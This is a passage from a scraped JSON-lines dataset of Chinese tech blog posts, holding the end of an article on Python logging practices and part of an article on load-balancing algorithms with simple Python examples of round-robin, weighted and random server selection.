class=\"crayon-e\">__init__</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a696015437790-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">func</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">f</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a696015437790-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">args</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">args</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a696015437790-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a696015437790-6\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">def </span><span class=\"crayon-e\">__str__</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37580a696015437790-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">str</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">func</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37580a696015437790-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37580a696015437790-9\"><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">debug</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"There are %s users logged in now.\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lazyEval</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">getUserCount</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n\n</div>\n<p>在log lever为INFO的时候，可以发现<em>“getUserCount is called”</em>也不会被输出了，即不会调用getUserCount函数，做到了真正的lazy logging。</p>\n<p>但是，这是非常不好的写法！除非你们保证所调用的函数是没有副作用的（side－effect），即函数的调用无状态，不会改变程序的状态，否则程序的状态居然会依赖于log level，这是一个陷阱，一个坑，一点都不pythonic。</p>\n<h2>consider async logging</h2>\n<p>日志的记录也是要消耗时间的，这也是我们不能到处打印日志的原因。一般来说，logging框架的效率都是比较高的，但是如果profile发现日志的输出确实带来了不容忽视的消耗，那么也是值得优化的，其中的一个方法就是异步log，以避免日志输出阻塞线程</p>\n<h1>conclusion</h1>\n<p>在网上看到这么一句话</p>\n<blockquote><p>Logs are like car insurance. Nobody wants to pay for it, but when something goes wrong everyone wants the best available</p></blockquote>\n<p>log就像车辆保险，没人愿意为保险付钱，但是一旦出了问题谁都又想有保险可用。</p>\n<p>我们打印日志的时候都很随意，于是在差bug的时候，就会骂别人、或者几天前的自己：SB！</p>\n<p>从今天起，写好每一条日志吧，与君共勉！</p>\n<h1>参考</h1>\n<ul>\n<li><a href=\"http://book.mixu.net/distsys/time.html\" target=\"_blank\">Distributed systems for fun and profit</a></li>\n<li><a href=\"https://docs.python.org/2/library/logging.html#logrecord-attributes\" target=\"_blank\">python logging#logrecord-attributes</a></li>\n<li><a href=\"https://garygregory.wordpress.com/2015/10/08/the-art-of-logging-advanced-message-formatting/\" target=\"_blank\">the-art-of-logging-advanced-message-formatting</a></li>\n</ul>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113413\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113413votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113413\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 11 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 4 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "2"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/b4822f398c6b3d29e8f309640f2bb305.png"], "title": "关于负载均衡的一切：总结与思考", "fav_nums": 2, "url": "http://blog.jobbole.com/113417/", "create_date": "2018/01/02", "url_object_id": "6811109c460504a206757c8ec1f476ae", "comment_nums": 3, "front_image_path": "full/454455dcb286199a6ce66f724472bfe5efeebea7.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/xybaby/p/7867735.html\">xybaby</a>   </div><p>古人云，不患寡而患不均。</p>\n<p>在计算机的世界，这就是大家耳熟能详的负载均衡（<a href=\"https://en.wikipedia.org/wiki/Load_balancing_(computing)\" target=\"_blank\">load balancing</a>），所谓负载均衡，就是说如果一组计算机节点（或者一组进程）提供<strong>相同的（同质的）服务</strong>，那么对服务的请求就应该均匀的分摊到这些节点上。负载均衡的前提一定是“provide a single Internet service from multiple servers”， 这些提供服务的节点被称之为server farm、server pool或者backend servers。</p>\n<p>这里的服务是广义的，可以是简单的计算，也可能是数据的读取或者存储。负载均衡也不是新事物，这种思想在多核CPU时代就有了，只不过在分布式系统中，负载均衡更是无处不在，这是分布式系统的天然特性决定的，分布式就是利用大量计算机节点完成单个计算机无法完成的计算、存储服务，既然有大量计算机节点，那么均衡的调度就非常重要。</p>\n<p>负载均衡的意义在于，让所有节点以最小的代价、最好的状态对外提供服务，这样系统吞吐量最大，性能更高，对于用户而言请求的时间也更小。而且，负载均衡增强了系统的可靠性，最大化降低了单个节点过载、甚至crash的概率。不难想象，如果一个系统绝大部分请求都落在同一个节点上，那么这些请求响应时间都很慢，而且万一节点降级或者崩溃，那么所有请求又会转移到下一个节点，造成雪崩。</p>\n<p>事实上，网上有很多文章介绍负载均衡的算法，大多都是大同小异。本文更多的是自己对这些算法的总结与思考。</p>\n<h1>一分钟了解负载均衡的一切</h1>\n<p>本章节的标题和内容都来自<a href=\"http://zhuanlan.51cto.com/art/201609/517313.htm\" target=\"_blank\">一分钟了解负载均衡的一切</a>这一篇文章。当然，原文的标题是夸张了点，不过文中列出了在一个大型web网站中各层是如何用到负载均衡的，一目了然。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/b4822f398c6b3d29e8f309640f2bb305.png\" alt=\"\"></p>\n<p>常见互联网分布式架构如上，分为客户端层、反向代理nginx层、站点层、服务层、数据层。可以看到，每一个下游都有多个上游调用，只需要做到，<strong>每一个上游都均匀访问每一个下游</strong>，就能实现“将请求/数据【均匀】分摊到多个操作单元上执行”。</p>\n<p>(1)【客户端层】到【反向代理层】的负载均衡，是通过“DNS轮询”实现的<br>\n(2)【反向代理层】到【站点层】的负载均衡，是通过“nginx”实现的<br>\n(3)【站点层】到【服务层】的负载均衡，是通过“服务连接池”实现的<br>\n(4)【数据层】的负载均衡，要考虑“数据的均衡”与“请求的均衡”两个点，常见的方式有“按照范围水平切分”与“hash水平切分”。</p>\n<p>数据层的负载均衡，在我之前的《<a href=\"http://www.cnblogs.com/xybaby/p/7076731.html\" target=\"_blank\">带着问题学习分布式系统之数据分片</a>》中有详细介绍。</p>\n<h1>算法衡量</h1>\n<p>在我看来，当我们提到一个负载均衡算法，或者具体的应用场景时，应该考虑以下问题</p>\n<p>第一，是否意识到不同节点的服务能力是不一样的，比如CPU、内存、网络、地理位置</p>\n<p>第二，是否意识到节点的服务能力是动态变化的，高配的机器也有可能由于一些突发原因导致处理速度变得很慢</p>\n<p>第三，是否考虑将同一个客户端，或者说同样的请求分发到同一个处理节点，这对于“有状态”的服务非常重要，比如session，比如分布式存储</p>\n<p>第四，谁来负责负载均衡，即谁充当负载均衡器（load balancer），balancer本身是否会成为瓶颈</p>\n<p>下面会结合具体的算法来考虑这些问题</p>\n<h1>负载均衡算法</h1>\n<h2>轮询算法（round-robin）</h2>\n<p>思想很简单，就是提供同质服务的节点逐个对外提供服务，这样能做到绝对的均衡。Python示例代码如下</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29c5d14d4624331895\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSERVER_LIST = [\r\n    '10.246.10.1',\r\n    '10.246.10.2',\r\n    '10.246.10.3',\r\n]\r\ndef round_robin(server_lst, cur = [0]):\r\n    length = len(server_lst)\r\n    ret = server_lst[cur[0] % length]\r\n    cur[0] = (cur[0] + 1) % length\r\n    return ret</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14d4624331895-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14d4624331895-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14d4624331895-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14d4624331895-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14d4624331895-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14d4624331895-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14d4624331895-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14d4624331895-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14d4624331895-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14d4624331895-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14d4624331895-1\"><span class=\"crayon-v\">SERVER_LIST</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14d4624331895-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'10.246.10.1'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14d4624331895-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'10.246.10.2'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14d4624331895-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'10.246.10.3'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14d4624331895-5\"><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14d4624331895-6\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">round_robin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cur</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14d4624331895-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14d4624331895-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ret</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">cur</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14d4624331895-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">cur</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cur</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">length</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14d4624331895-10\"><span class=\"crayon-e\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ret</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0018 seconds] -->\r\n\n</div>\n<p>可以看到，所有的节点都是以同样的概率提供服务，即没有考虑到节点的差异，也许同样数目的请求，高配的机器CPU才20%，低配的机器CPU已经80%了</p>\n<h2>加权轮询算法（weight round-robin）</h2>\n<p>加权轮训算法就是在轮训算法的基础上，考虑到机器的差异性，分配给机器不同的权重，能者多劳。注意，这个权重的分配依赖于请求的类型，比如计算密集型，那就考虑CPU、内存；如果是IO密集型，那就考虑磁盘性能。Python示例代码如下</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29c5d14de620972014\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nWEIGHT_SERVER_LIST = {\r\n    '10.246.10.1': 1,\r\n    '10.246.10.2': 3,\r\n    '10.246.10.3': 2,\r\n}\r\n\r\ndef weight_round_robin(servers, cur = [0]):\r\n    weighted_list = []\r\n    for k, v in servers.iteritems():\r\n        weighted_list.extend([k] * v)\r\n\r\n    length = len(weighted_list)\r\n    ret = weighted_list[cur[0] % length]\r\n    cur[0] = (cur[0] + 1) % length\r\n    return ret</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14de620972014-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14de620972014-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14de620972014-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14de620972014-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14de620972014-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14de620972014-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14de620972014-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14de620972014-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14de620972014-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14de620972014-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14de620972014-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14de620972014-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14de620972014-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14de620972014-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14de620972014-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14de620972014-1\"><span class=\"crayon-v\">WEIGHT_SERVER_LIST</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14de620972014-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'10.246.10.1'</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14de620972014-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'10.246.10.2'</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14de620972014-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'10.246.10.3'</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14de620972014-5\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14de620972014-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14de620972014-7\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">weight_round_robin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cur</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14de620972014-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14de620972014-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">iteritems</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14de620972014-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">extend</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14de620972014-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14de620972014-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14de620972014-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ret</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">cur</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14de620972014-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">cur</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cur</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">length</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14de620972014-15\"><span class=\"crayon-e\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ret</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0029 seconds] -->\r\n\n</div>\n<h2>随机算法（random）</h2>\n<p>这个就更好理解了，随机选择一个节点服务，按照概率，只要请求数量足够多，那么也能达到绝对均衡的效果。而且实现简单很多</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29c5d14e3944430391\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef random_choose(server_lst):\r\n    import random\r\n    random.seed()\r\n    return random.choice(server_lst)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div 